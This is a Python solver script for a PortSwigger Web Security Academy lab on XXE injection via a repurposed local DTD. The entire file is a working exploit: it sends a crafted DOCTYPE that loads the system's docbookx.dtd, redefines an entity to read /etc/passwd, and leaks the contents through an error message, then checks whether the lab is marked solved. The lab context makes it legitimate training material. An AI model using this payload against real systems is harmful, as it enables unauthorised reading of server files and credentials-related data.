import requests
import argparse

parser = argparse.ArgumentParser(description='Solves the following Lab: Exploiting XXE to retrieve data by repurposing a local DTD')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

XHEADER = '<?xml version="1.0" encoding="UTF-8"?>' 
dtd = '''
<!DOCTYPE xxe [
<!ENTITY % internal_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOtech '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%internal_dtd;
]>
'''
xxe = '<stockCheck><productId>%internal_dtd;</productId><storeId>1</storeId></stockCheck>'

r = requests.post("https://" + lab.id + ".web-security-academy.net/product/stock", data=f"{XHEADER}{dtd}{xxe}")
print(r.text)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")